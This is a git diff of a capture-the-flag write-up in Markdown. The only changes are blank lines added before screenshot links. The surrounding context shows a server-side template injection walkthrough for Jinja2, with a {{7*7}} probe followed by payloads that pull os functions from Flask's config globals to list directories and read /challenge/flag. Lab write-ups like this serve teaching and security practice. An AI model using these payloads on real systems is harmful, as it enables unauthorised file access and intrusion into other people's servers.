@@ -25,6 +25,7 @@ Entered:
 {{7*7}}
 ```
 ✅ Confirms that template expressions are evaluated → SSTI vulnerability exists.  
+
 ![Step 1 – SSTI Reflection](../screenshots/ssti1-reflection.png)
 
 ---
@@ -36,6 +37,7 @@ Payload:
 {{config.__class__.__init__.__globals__['__builtins__']['__import__']('os').listdir('/')}}
 ```
 ✅ Identified a suspicious directory.  
+
 ![Step 2 – List Root](../screenshots/ssti1-root-dir.png)
 
 ---
@@ -47,6 +49,7 @@ Payload:
 {{config.__class__.__init__.__globals__['__builtins__']['__import__']('os').listdir('/challenge')}}
 ```
 🎯 Located the `flag` file.  
+
 ![Step 3 – Challenge Folder](../screenshots/ssti1-challenge-dir.png)
 
 ---
@@ -58,6 +61,7 @@ Payload:
 {{config.__class__.__init__.__globals__['__builtins__']['open']('/challenge/flag').read()}}
 ```
 📥 Extracted the flag.  
+
 ![Step 4 – Flag Found](../screenshots/ssti1-flag-read.png)
 
 ---
